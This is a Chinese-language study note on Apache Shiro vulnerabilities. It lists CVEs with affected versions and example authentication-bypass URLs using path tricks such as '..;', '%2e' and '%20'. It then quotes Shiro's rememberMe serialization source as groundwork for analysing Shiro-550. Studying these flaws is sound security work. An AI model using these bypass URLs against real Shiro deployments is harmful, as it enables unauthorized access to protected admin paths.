# Learn

Shiro
 - CVE-2010-3863:
   Shiro < 1.1.0
   JSecurity 0.9.X
   在getPathWithinApplication中调用getRequestUri方法获取Uri,没有对路径进行标准化处理,导致可以绕过权限认证。

   [users]
   zhang=123,admin
   wang=123,admin,vip
   每一行定义一个用户, 格式是 username = password, role1, role2, ..., roleN
    ​
    [roles]
    admin=user:delete
    角色在这里定义, 格式是 roleName = perm1, perm2, ..., permN
    说明1: 权限名可以使用带有层次的命名方式, 使用冒号来分割层次关系, 比如 user:create 或 user:poweruser:update 权限.
    //说明2: user:* 这样的权限, 代表具有 user:create 和 user:poweruser:update 权限.
    ​
   [urls]
   /static/**=anon
   /login=anon
   /authc/admin/user/delete=perms["user:delete"]
   /authc/admin/user/create=perms["user:create"]
   /authc/admin/**=roles[admin]
   /authc/home=roles[admin,vip]
   /authc/**=authc
   
   绕过：
    http://127.0.0.1//authc/admin
    http://127.0.0.1/./authc/admin
    http://127.0.0.1/xxx/../authc/admin

 - CVE-2016-6802:
   Shiro < 1.3.2
   getContextPath方法中未标准化路径，该漏洞允许攻击者通过利用非根 Servlet 上下文路径，绕过预期的 Servlet 过滤器，从而获取访问权限。
   http://127.0.0.1/xxxx/../admin/index.jsp

 - CVE-2020-1957:
   Shiro < 1.5.2
   spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问
   chainDefinition.addPathDefinition("/logout", "logout");
   chainDefinition.addPathDefinition("/admin/**", "authc");
   http://127.0.0.1/admin/
   http://127.0.0.1/xxx/..;/admin/

 - CVE-2020-13933:
   Shiro < 1.6.0
   Apache Shiro 1.5.3之前的版本，将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过
   http://127.0.0.1/;/admin/
   http://127.0.0.1/admin/xx
 - CVE-2020-17510:
   Shiro < 1.7.0
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%2e
 - CVE-2020-17523:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2021-41303:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2022-32532
   Shiro < 1.9.1



   Shiro 550 漏洞分析：
   登录：   
   package org.apache.shiro.mgt;
     AbstractRememberMeManager.java
       public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
        //清除之前的认证
        forgetIdentity(subject);

        //保存新的认证
        //如果勾选了记住我就进入记住认证的函数
        if (isRememberMe(token)) {
            rememberIdentity(subject, token, info);
        } else {
            if (log.isDebugEnabled()) {
                log.debug("AuthenticationToken did not indicate RememberMe is requested.  " +
                        "RememberMe functionality will not be executed for corresponding account.");
            }
        }
      }
       public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
         //获取认证的信息
         PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);
        //保存认证的信息
         rememberIdentity(subject, principals);
       }
   
    protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
        byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
        rememberSerializedIdentity(subject, bytes);
    }
    protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
        //重点 序列化认证信息
        byte[] bytes = serialize(principals);
        if (getCipherService() != null) {
            bytes = encrypt(bytes);
        }
        return bytes;
    }
    protected byte[] encrypt(byte[] serialized) {
        byte[] value = serialized;
        //获取加密类
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            //加密，AES/CBC/PKCS5Padding
            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
            value = byteSource.getBytes();
        }
        return value;
    }
  protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {

        if (!WebUtils.isHttp(subject)) {
            if (log.isDebugEnabled()) {
                String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet " +
                        "request and response in order to set the rememberMe cookie. Returning immediately and " +
                        "ignoring rememberMe operation.";
                log.debug(msg);
            }
            return;
        }


        HttpServletRequest request = WebUtils.getHttpRequest(subject);
        HttpServletResponse response = WebUtils.getHttpResponse(subject);

        //base 64 encode it and store as a cookie:
        String base64 = Base64.encodeToString(serialized);

        Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
        Cookie cookie = new SimpleCookie(template);
        cookie.setValue(base64);
        cookie.saveTo(request, response);
    }


    protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

        if (!WebUtils.isHttp(subjectContext)) {
            if (log.isDebugEnabled()) {
                String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                        "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                        "immediately and ignoring rememberMe operation.";
                log.debug(msg);
            }
            return null;
        }

        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
        if (isIdentityRemoved(wsc)) {
            return null;
        }

        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
        HttpServletResponse response = WebUtils.getHttpResponse(wsc);

        String base64 = getCookie().readValue(request, response);
        // Browsers do not always remove cookies immediately (SHIRO-183)
        // ignore cookies that are scheduled for removal
        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

        if (base64 != null) {
            base64 = ensurePadding(base64);
            if (log.isTraceEnabled()) {
                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
            }
            byte[] decoded = Base64.decode(base64);
            if (log.isTraceEnabled()) {
                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
            }
            return decoded;
        } else {
            //no cookie set - new site visitor?
            return null;
        }
    }
